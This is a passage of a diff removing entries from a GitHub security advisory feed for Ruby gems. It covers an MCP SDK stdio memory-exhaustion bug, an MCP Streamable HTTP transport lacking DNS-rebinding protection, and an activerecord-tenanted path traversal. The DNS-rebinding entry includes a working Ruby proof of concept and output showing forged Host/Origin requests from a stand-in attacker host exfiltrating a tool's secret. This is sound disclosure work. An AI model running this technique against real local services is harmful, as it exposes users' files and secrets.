-client.start
-# any request triggers read_response → @stdout.gets → unbounded String growth
-client.send_request(method: "initialize", params: {})
-</code></pre>
-<p>Observed: process RSS grows linearly with bytes produced; <code>gets</code> never returns; process is OOM-killed.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p><code>IO#gets</code> accepts a second <code>limit</code> argument. Apply a configurable maximum line length (default suggested: 4 MiB — large enough for any realistic JSON-RPC frame including base64-embedded images) at all three call sites, and treat an over-limit line as a transport error that closes the connection:</p>
-<pre><code class="language-ruby">MAX_LINE_BYTES = 4 * 1024 * 1024
-
-while @open &amp;&amp; (line = $stdin.gets("\n", MAX_LINE_BYTES))
-  unless line.end_with?("\n")
-    # gets returned because the limit was hit, not because a newline arrived
-    raise MCP::TransportError, "stdio frame exceeds #{MAX_LINE_BYTES} bytes without newline"
-  end
-  ...
-end
-</code></pre>
-<p>Apply the same pattern at <code>stdio_transport.rb:76</code> and <code>client/stdio.rb:228</code>. Expose <code>MAX_LINE_BYTES</code> as a constructor option on both transports for callers with legitimate large-frame needs.</p>
-<h2 id="credit">Credit</h2>
-<p>Identified during a cross-SDK audit of the stdio unbounded-buffer vulnerability class, prompted by GHSA-74gp-qhv5-v493 (reporter: tonghuaroot).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-7683-3w9x-ch42">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-7683-3w9x-ch42</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63119">https://nvd.nist.gov/vuln/detail/CVE-2026-63119</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/267b8fa6285453525c81ce43db6b7dcd7a8a8c2f">https://github.com/modelcontextprotocol/ruby-sdk/commit/267b8fa6285453525c81ce43db6b7dcd7a8a8c2f</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-7683-3w9x-ch42">https://github.com/advisories/GHSA-7683-3w9x-ch42</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7683-3w9x-ch42</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-30T14:41:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Streamable HTTP transport lacks DNS-rebinding (Host/Origin) protection]]></title>
-        <id>https://github.com/advisories/GHSA-rjr6-rcgv-9m7m</id>
-        <link href="https://github.com/advisories/GHSA-rjr6-rcgv-9m7m"/>
-        <updated>2026-07-30T14:41:42.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>MCP::Server::Transports::StreamableHTTPTransport</code> (the Rack-mountable Streamable HTTP transport in the <code>mcp</code> gem) processes every incoming JSON-RPC request without ever inspecting the HTTP <code>Host</code> or <code>Origin</code> request headers. There is no <code>AllowedHosts</code>/<code>AllowedOrigins</code> allowlist and no DNS-rebinding guard anywhere in the transport. A local MCP server that binds a loopback or LAN HTTP port is therefore reachable by any web origin a victim's browser visits, via a DNS-rebinding attack: a malicious page rebinds its own hostname to <code>127.0.0.1</code>, then drives the local MCP server cross-origin to enumerate and invoke its tools and exfiltrate their output. This is the standard browser-driven local-service attack that the MCP Streamable HTTP guidance exists to prevent.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>An attacker who can get a victim to open a web page can reach any MCP server the victim runs locally over the Streamable HTTP transport (e.g. a developer-tools or filesystem MCP server on <code>localhost</code>).</li>
-<li>Because the transport issues a session and dispatches <code>tools/list</code> / <code>tools/call</code> from a foreign <code>Host</code>/<code>Origin</code> with no rejection, the attacker can drive arbitrary server-exposed tools and read their results, exfiltrating local data (files, secrets, command output) to the attacker's origin.</li>
-<li>The blast radius is whatever the locally-running MCP server exposes. For MCP servers wired to filesystem, shell, or credential tools, this is sensitive-data disclosure and, depending on the tool set, local action execution.</li>
-</ul>
-<h2 id="vulnerable-code">Vulnerable code</h2>
-<p>File: <code>lib/mcp/server/transports/streamable_http_transport.rb</code> (gem <code>mcp</code> 0.18.0).</p>
-<p>The Rack entrypoint and POST handler validate <code>Accept</code>, <code>Content-Type</code>, <code>Mcp-Session-Id</code>, and <code>Mcp-Protocol-Version</code>, but never <code>Host</code> or <code>Origin</code>:</p>
-<pre><code class="language-ruby"># call(env) -&gt; handle_request(Rack::Request.new(env))  (line 56)
-def handle_post(request)
-  required_types = @enable_json_response ? REQUIRED_POST_ACCEPT_TYPES_JSON : REQUIRED_POST_ACCEPT_TYPES_SSE
-  accept_error = validate_accept_header(request, required_types)   # line 335 - checks Accept only
-  return accept_error if accept_error
-
-  content_type_error = validate_content_type(request)             # line 338 - checks Content-Type only
-  return content_type_error if content_type_error
-
-  body_string = request.body.read
-  session_id = extract_session_id(request)                        # line 342 - reads HTTP_MCP_SESSION_ID
-</code></pre>
-<p>No statement anywhere in <code>handle_post</code>, <code>handle_request</code>, or any helper reads <code>request.env["HTTP_HOST"]</code> or <code>request.env["HTTP_ORIGIN"]</code>.</p>
-<p>The only request-env reads in the whole class are:</p>
-<ul>
-<li><code>extract_session_id</code> -&gt; <code>request.env["HTTP_MCP_SESSION_ID"]</code> (line 489)</li>
-<li><code>validate_accept_header</code> -&gt; <code>request.env["HTTP_ACCEPT"]</code> (line 493)</li>
-<li><code>validate_content_type</code> -&gt; <code>request.env["CONTENT_TYPE"]</code> (line 512)</li>
-<li><code>validate_protocol_version_header</code> -&gt; <code>request.env["HTTP_MCP_PROTOCOL_VERSION"]</code> (line 546)</li>
-</ul>
-<p>A repository-wide search of <code>lib/</code> for <code>HTTP_HOST</code>, <code>HTTP_ORIGIN</code>, <code>allowed_host</code>, <code>allowed_origin</code>, <code>rebind</code>, or <code>dns.rebind</code> returns zero matches, confirming no allowlist or rebinding guard exists in the shipped library. The <code>examples/</code> tree mounts <code>Rack::Cors</code> as application-level middleware, but that is example glue, not a transport-level control, and CORS does not stop a DNS-rebinding attack that arrives as a same-origin request after rebinding.</p>
-<h2 id="how-the-input-reaches-the-sink-attack-scenario">How the input reaches the sink (attack scenario)</h2>
-<ol>
-<li>A developer runs an MCP server over <code>StreamableHTTPTransport</code>, mounted as a Rack app on a local HTTP port (loopback or LAN).</li>
-<li>The victim opens <code>http://evil.attacker.com</code> in a browser. The page resolves to the attacker's server, which then re-answers DNS for <code>evil.attacker.com</code> with <code>127.0.0.1</code> (DNS rebinding). The browser now treats requests to <code>evil.attacker.com</code> as going to the local MCP server, with <code>Host: evil.attacker.com</code> / <code>Origin: http://evil.attacker.com</code>.</li>
-<li>The page POSTs an <code>initialize</code> request. The transport accepts it (it never looks at <code>Host</code>/<code>Origin</code>), creates a session, and returns <code>Mcp-Session-Id</code>.</li>
-<li>The page then POSTs <code>tools/call</code>, and the transport executes the server's tool and returns its output to the foreign origin. Local data is exfiltrated.</li>
-</ol>
-<h2 id="proof-of-concept-end-to-end-reproduction">Proof of concept (end-to-end reproduction)</h2>
-<p>Run against the real released gem <code>mcp</code> 0.18.0 (no stubs). The script builds an <code>MCP::Server</code> with a tool that returns sensitive local data, instantiates the real <code>StreamableHTTPTransport</code>, and drives it with <code>Rack::Request</code> env hashes carrying a forged <code>Host</code>/<code>Origin</code>. It then re-runs as a legitimate localhost client (negative control).</p>
-<p>Install:</p>
-<pre><code>gem install mcp -v 0.18.0   # pulls addressable, json-schema, public_suffix
-gem install rack            # required by StreamableHTTPTransport
-</code></pre>
-<p>PoC (<code>poc_f1_dnsrebind.rb</code>):</p>
-<pre><code class="language-ruby"># frozen_string_literal: true
-require "mcp"
-require "rack"
-require "json"
-require "stringio"
-
-puts "mcp gem version under test: #{MCP::VERSION}"
-puts "transport source: #{MCP::Server::Transports::StreamableHTTPTransport.instance_method(:handle_post).source_location.inspect}"
-puts
-
-# A tool whose output is sensitive local data an attacker wants to exfiltrate.
-secret_tool = MCP::Tool.define(name: "read_local_secret", description: "returns a local secret") do |*|
-  MCP::Tool::Response.new([{ type: "text", text: "TOP-SECRET-LOCAL-DATA-9f3a" }])
-end
-
-server = MCP::Server.new(name: "poc_server", version: "1.0.0", tools: [secret_tool])
-transport = MCP::Server::Transports::StreamableHTTPTransport.new(server)
-PROTO = MCP::Configuration::SUPPORTED_STABLE_PROTOCOL_VERSIONS.last
-
-def rack_post(transport, body_hash, host:, origin:, session_id: nil, proto: nil)
-  body = JSON.generate(body_hash)
-  env = {
-    "REQUEST_METHOD" =&gt; "POST", "PATH_INFO" =&gt; "/",
-    "HTTP_HOST"   =&gt; host,    # attacker-controlled Host (DNS-rebind primary vector)
-    "HTTP_ORIGIN" =&gt; origin,  # attacker-controlled Origin (cross-origin browser vector)
-    "HTTP_ACCEPT" =&gt; "application/json, text/event-stream",
-    "CONTENT_TYPE" =&gt; "application/json",
-    "rack.input" =&gt; StringIO.new(body), "CONTENT_LENGTH" =&gt; body.bytesize.to_s,
-  }
-  env["HTTP_MCP_SESSION_ID"] = session_id if session_id
-  env["HTTP_MCP_PROTOCOL_VERSION"] = proto if proto
-  status, headers, resp = transport.call(env)
-  collected = +""
-  if resp.respond_to?(:each)
-    resp.each { |c| collected &lt;&lt; c.to_s }
-  elsif resp.respond_to?(:call)            # stateful tools/call returns an SSE-stream Proc body
-    sink = Object.new
-    sink.define_singleton_method(:write) { |s| collected &lt;&lt; s.to_s }
-    sink.define_singleton_method(:flush) {}
-    sink.define_singleton_method(:close) {}
-    resp.call(sink)
-  end
-  [status, headers, collected]
-end
-
-puts "========== ATTACK: forged Host: attacker.evil.com  Origin: http://evil.attacker.com =========="
-init_body = { jsonrpc: "2.0", id: 1, method: "initialize",
-  params: { protocolVersion: PROTO, capabilities: {}, clientInfo: { name: "evil-page", version: "1.0" } } }
-status, headers, body = rack_post(transport, init_body, host: "attacker.evil.com", origin: "http://evil.attacker.com")
-puts "[initialize] HTTP status      : #{status}"
-puts "[initialize] Mcp-Session-Id   : #{headers["Mcp-Session-Id"].inspect}"
-puts "[initialize] response body     : #{body}"
-session = headers["Mcp-Session-Id"]
-
-call_body = { jsonrpc: "2.0", id: 2, method: "tools/call",
-  params: { name: "read_local_secret", arguments: {} } }
-status2, _h2, body2 = rack_post(transport, call_body,
-  host: "attacker.evil.com", origin: "http://evil.attacker.com", session_id: session, proto: PROTO)
-puts "[tools/call] HTTP status       : #{status2}"
-puts "[tools/call] response body      : #{body2}"
-attack_ok = (status == 200 &amp;&amp; session &amp;&amp; status2 == 200 &amp;&amp; body2.include?("TOP-SECRET-LOCAL-DATA-9f3a"))
-puts
-puts "ATTACK VERDICT: #{attack_ok ? "EXFILTRATED" : "blocked"} -- foreign Host/Origin obtained a session AND read the local secret with NO 403."
-puts
-
-puts "========== NEGATIVE CONTROL: legitimate Host: 127.0.0.1:8080  Origin: http://127.0.0.1:8080 =========="
-status3, headers3, _b3 = rack_post(transport, init_body, host: "127.0.0.1:8080", origin: "http://127.0.0.1:8080")
-puts "[initialize] HTTP status      : #{status3}"
-puts "[initialize] Mcp-Session-Id   : #{headers3["Mcp-Session-Id"].inspect}"
-puts
-puts "CONTROL VERDICT: legitimate client also gets HTTP #{status3} + session -- transport applies the SAME (zero) Host/Origin policy to both."
-</code></pre>
-<p>Captured output (verbatim):</p>
-<pre><code>mcp gem version under test: 0.18.0
-transport source: [".../gems/mcp-0.18.0/lib/mcp/server/transports/streamable_http_transport.rb", 333]
-
-========== ATTACK: forged Host: attacker.evil.com  Origin: http://evil.attacker.com ==========
-[initialize] HTTP status      : 200
-[initialize] Mcp-Session-Id   : "d4fb30b4-b4ec-49a1-a58b-f4cc02bee64b"
-[initialize] response body     : {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{"listChanged":true},"prompts":{"listChanged":true},"resources":{"listChanged":true},"logging":{}},"serverInfo":{"name":"poc_server","version":"1.0.0"}}}
-[tools/call] HTTP status       : 200
-[tools/call] response body      : data: {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"TOP-SECRET-LOCAL-DATA-9f3a"}],"isError":false}}
-
-ATTACK VERDICT: EXFILTRATED -- foreign Host/Origin obtained a session AND read the local secret with NO 403.
-
-========== NEGATIVE CONTROL: legitimate Host: 127.0.0.1:8080  Origin: http://127.0.0.1:8080 ==========
-[initialize] HTTP status      : 200
-[initialize] Mcp-Session-Id   : "bf707a19-a22a-4ff2-aeae-62c20cd7141b"
-
-CONTROL VERDICT: legitimate client also gets HTTP 200 + session -- transport applies the SAME (zero) Host/Origin policy to both.
-</code></pre>
-<p>The forged <code>Host: attacker.evil.com</code> / <code>Origin: http://evil.attacker.com</code> request obtained a valid session and exfiltrated the local secret (<code>TOP-SECRET-LOCAL-DATA-9f3a</code>) via <code>tools/call</code>, with the transport returning HTTP 200 throughout and never a 403. The negative control confirms the transport applies the identical (empty) policy to a legitimate localhost client, proving there is no Host/Origin discrimination at all.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Add an opt-in but secure-by-default Host/Origin allowlist to <code>StreamableHTTPTransport</code>, mirroring the DNS-rebinding protection that the TypeScript, Python, Go, Rust, C#, and Java MCP SDKs already ship:</p>
-<ul>
-<li>Accept <code>allowed_hosts:</code> and <code>allowed_origins:</code> keyword arguments in <code>initialize</code>.</li>
-<li>In <code>handle_request</code> (before any dispatch), read <code>request.env["HTTP_HOST"]</code> and <code>request.env["HTTP_ORIGIN"]</code>. If an allowlist is configured and the value is not on it, return <code>403 Forbidden</code>.</li>
-<li>Default to allowing only loopback hosts (<code>127.0.0.1</code>, <code>[::1]</code>, <code>localhost</code>) and an empty/absent <code>Origin</code>, so a stock local deployment is protected against rebinding out of the box while same-process and same-host clients keep working. Document how to widen the allowlist for non-loopback deployments.</li>
-</ul>
-<p>A concrete patch adds an <code>AllowedHostsValidation</code> check invoked at the top of <code>handle_request</code>. See the Fix PR.</p>
-<h2 id="fix-pr">Fix PR</h2>
-<p>A fix PR implementing the Host/Origin allowlist with a secure loopback default is open against this advisory's private temporary fork: <a href="https://github.com/modelcontextprotocol/ruby-sdk-ghsa-rjr6-rcgv-9m7m/pull/1">https://github.com/modelcontextprotocol/ruby-sdk-ghsa-rjr6-rcgv-9m7m/pull/1</a> . With the patch loaded, the forged-Host request is rejected with <code>403</code> (<code>{"error":"Forbidden: Host not allowed (DNS-rebinding protection)"}</code>) while a legitimate loopback <code>Host: 127.0.0.1:8080</code> request is still served (HTTP 200, session issued).</p>
-<h2 id="credit">Credit</h2>
-<p>Reported by tonghuaroot.</p>
-<h2 id="reporter-notes">Reporter notes</h2>
-<p>This issue was found by source review of the <code>mcp</code> gem's Streamable HTTP transport and confirmed end-to-end against the released gem <code>mcp</code> 0.18.0 as shown above. It is reported independently on its own merits.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-rjr6-rcgv-9m7m">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-rjr6-rcgv-9m7m</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63118">https://nvd.nist.gov/vuln/detail/CVE-2026-63118</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/ba543083a7594e7892b29464b89091816446ff7a">https://github.com/modelcontextprotocol/ruby-sdk/commit/ba543083a7594e7892b29464b89091816446ff7a</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjr6-rcgv-9m7m">https://github.com/advisories/GHSA-rjr6-rcgv-9m7m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjr6-rcgv-9m7m</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-30T14:41:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[activerecord-tenanted] ActiveRecord::Tenanted::Storage::DiskService#path_for has a possible path traversal]]></title>
-        <id>https://github.com/advisories/GHSA-pmwx-rm49-xv39</id>
-        <link href="https://github.com/advisories/GHSA-pmwx-rm49-xv39"/>
-        <updated>2026-07-29T17:06:01.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Active Record Tenanted's override of Active Storage's <code>DiskService#path_for</code> does not validate that the resolved filesystem path remains within the storage root directory. If a blob key containing path traversal sequences (e.g. <code>../</code>) is used, it could allow reading, writing, or deleting arbitrary files on the server. Blob keys are expected to be trusted strings, but some applications could be passing user input as keys and would be affected.</p>
-<h3 id="mitigation">Mitigation</h3>
-<p>Upgrade to Active Record Tenanted v0.7.0 or later.</p>
-<p>As a workaround, do not use untrusted user input as blob keys. Blob keys are expected to be trusted strings.</p>
-<h3 id="credit">Credit</h3>
-<p>This issue was responsibly reported by @tonghuaroot.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/basecamp/activerecord-tenanted/security/advisories/GHSA-pmwx-rm49-xv39">https://github.com/basecamp/activerecord-tenanted/security/advisories/GHSA-pmwx-rm49-xv39</a></li>
-<li><a href="https://github.com/rails/rails/security/advisories/GHSA-9xrj-h377-fr87">https://github.com/rails/rails/security/advisories/GHSA-9xrj-h377-fr87</a></li>
-<li><a href="https://github.com/basecamp/activerecord-tenanted/pull/307">https://github.com/basecamp/activerecord-tenanted/pull/307</a></li>
-<li><a href="https://github.com/basecamp/activerecord-tenanted/commit/b242c8ad9bf58bbd7f5a032d153b0f29db54b9ba">https://github.com/basecamp/activerecord-tenanted/commit/b242c8ad9bf58bbd7f5a032d153b0f29db54b9ba</a></li>
-<li><a href="https://github.com/basecamp/activerecord-tenanted/releases/tag/v0.7.0">https://github.com/basecamp/activerecord-tenanted/releases/tag/v0.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-pmwx-rm49-xv39">https://github.com/advisories/GHSA-pmwx-rm49-xv39</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pmwx-rm49-xv39</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-07-29T17:06:00.000Z</published>
     </entry>
 </feed>
